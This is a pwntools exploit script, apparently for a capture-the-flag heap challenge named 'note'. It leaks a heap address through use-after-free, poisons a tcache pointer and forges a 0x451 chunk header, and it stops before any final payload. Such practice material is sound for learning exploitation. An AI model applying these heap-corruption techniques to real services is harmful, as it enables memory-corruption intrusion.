from pwn import *

BEDUG = True

if BEDUG==True:
    io = process('./note')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    io = remote('45.122.249.68', 10007)
    libc = ELF('./libc.so.6')

def add(index, size, content):
    print(io.recvuntil(b'> '))
    io.sendline(b'1')
    print(io.recvuntil(b'Index: '))
    io.sendline(str(index).encode('utf-8'))
    print(io.recvuntil(b'Note size: '))
    io.sendline(str(size).encode('utf-8'))
    print(io.recvuntil(b'Content: '))
    io.send(content)

def edit(index, content):
    print(io.recvuntil(b'> '))
    io.sendline(b'2')
    print(io.recvuntil(b'Index: '))
    io.sendline(str(index).encode('utf-8'))
    print(io.recvuntil(b'Content: '))
    io.send(content)

def view(index):
    print(io.recvuntil(b'> '))
    io.sendline(b'3')
    print(io.recvuntil(b'Index: '))
    io.sendline(str(index).encode('utf-8'))
    print(io.recvuntil(b'Note content: '))

def free(index):
    print(io.recvuntil(b'> '))
    io.sendline(b'4')
    print(io.recvuntil(b'Index: '))
    io.sendline(str(index).encode('utf-8'))

add(0, 0x68, b'A')
add(1, 0x68, b'A')
add(2, 0x68, b'A')
add(3, 0x68, b'A')
add(4, 0x68, b'A')
free(1)
free(0)
view(0)
heap = u64(io.recv(6)+b'\0\0')
log.info("HEAP: "+hex(heap))
chunk = heap - 0x308 - 0x8 + 0x10
edit(0, p64(chunk)[:6])
add(5, 0x68, b'AAAAA')
add(6, 0x68, p64(0)+p64(0x451))
pause()
free(6)
add(5, 0x20, b'AAAAA')